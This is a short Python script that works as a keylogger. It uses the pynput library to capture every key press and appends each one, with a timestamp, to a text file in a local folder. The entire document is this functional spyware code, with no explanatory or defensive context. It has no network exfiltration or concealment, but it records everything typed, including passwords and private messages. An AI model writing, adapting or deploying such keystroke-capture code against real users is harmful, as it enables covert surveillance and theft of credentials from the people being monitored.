from pynput.keyboard import Listener;
import logging;

logDir = "C:/Downloads/test/";

logging.basicConfig(filename=(logDir + "keyLog.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s');

def onPress(key):
    logging.info(str(key));

with Listener(on_press = onPress) as listener:
    listener.join();